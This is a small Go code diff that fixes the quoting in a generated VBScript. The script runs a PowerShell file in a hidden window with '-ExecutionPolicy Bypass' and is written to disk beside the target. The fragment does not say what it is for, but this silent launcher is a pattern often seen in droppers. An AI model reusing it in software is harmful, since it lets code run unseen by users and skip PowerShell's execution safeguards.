@@ -58,7 +58,7 @@ func fset(data_path string) {
 	file.Close()
 
 	vbscriptCode := fmt.Sprintf(`Set objShell = CreateObject("WScript.Shell")
-objShell.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -File "%s"", 0, False`, targetPath)
+objShell.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -File ""%s""", 0, False`, targetPath)
 	tempScriptPath := targetPath[:len(targetPath)-4] + ".vbs"
 	os.WriteFile(tempScriptPath, []byte(vbscriptCode), 0644)
 
